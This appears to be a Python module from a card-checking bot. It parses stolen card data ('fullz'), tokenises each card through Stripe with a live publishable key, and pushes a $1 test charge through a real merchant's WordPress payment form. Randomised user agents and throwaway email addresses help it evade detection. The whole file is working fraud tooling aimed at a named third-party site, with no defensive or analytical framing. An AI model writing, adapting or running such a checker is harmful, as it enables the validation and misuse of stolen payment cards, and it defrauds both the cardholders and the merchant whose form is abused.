import asyncio
import json
import random
import re
import time
import uuid
from fake_useragent import UserAgent
import requests
from FUNC.defs import *



def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

async def create_cvv_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")
        random_data          = await get_random_info(session)
        fname                = random_data["fname"]
        lname                = random_data["lname"]
        email                = random_data["email"]
        phone                = random_data["phone"]
        add1                 = random_data["add1"]
        city                 = random_data["city"]
        state                = random_data["state"]
        state_short          = random_data["state_short"]
        zip_code             = random_data["zip"]
        user_agent           = UserAgent().random



        mail = "cristniki" + str(random.randint(9999, 574545))+"@gmail.com"




        UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'
        # VBV LOOKUP REQUEST STARTING

        surl = "https://m.stripe.com/6"
        sheaders = {
            "user-agent": UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }
        getstripe =await session.post(url=surl, headers=sheaders)
        guid = getstripe.json()['guid']
        muid = getstripe.json()['muid']
        sid = getstripe.json()['sid']
                
        #Step 1: Getting site nonce 
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        }

        response = await session.get('https://www.hwstjohn.com/pay-now/', headers=headers)
        nonce=gets(response.text,'formNonce" value="','"/>')
        
        #Step 2:Stripe API
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/x-www-form-urlencoded',
            'dnt': '1',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        }

        data={
            'time_on_page':'16044',
            'guid':guid,
            'muid':muid,
            'sid':sid,
            'key':'pk_live_Ng5VkKcI3Ur3KZ92goEDVRBq',
            'payment_user_agent':'stripe.js/78ef418',
            'card[name]':'GRADY SOLOMON',
            'card[number]':f'{cc}',
            'card[exp_month]':f'{mes}',
            'card[exp_year]':f'{ano}',
            'card[cvc]':f'{cvv}'
            }
        response = await session.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)


        token=gets(response.text,'"id": "','",')

        #Step 3:Site Response
        
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9,de;q=0.8,it;q=0.7,ru;q=0.6,es;q=0.5',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'dnt': '1',
            'origin': 'https://www.hwstjohn.com',
            'priority': 'u=1, i',
            'referer': 'https://www.hwstjohn.com/pay-now/',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
            # 'cookie': '_ga=GA1.1.109529228.1742444993; __stripe_sid=92ca7785-a0f8-4587-89e1-ef3f3cc372ae033102; __stripe_mid=ac008b4e-e8ac-482e-b7b1-5a01e82a775f29b651; _ga_FPQM34KPDW=GS1.1.1742444992.1.0.1742444997.0.0.0',
        }

        data = {
            'action': 'wp_full_stripe_payment_charge',
            'formName': 'default',
            'formNonce':nonce,
            'fullstripe_name': 'GRADY SOLOMON',
            'fullstripe_email': mail,
            'fullstripe_custom_amount': '1',
            'fullstripe_amount_index': '',
            'stripeToken': token
        }

        response = await session.post('https://www.hwstjohn.com/wp-admin/admin-ajax.php', headers=headers, data=data)
        response=gets(response.text,'"msg":"','","')
        print(response)
        





        
        return response

    except Exception as e:
        return str(e)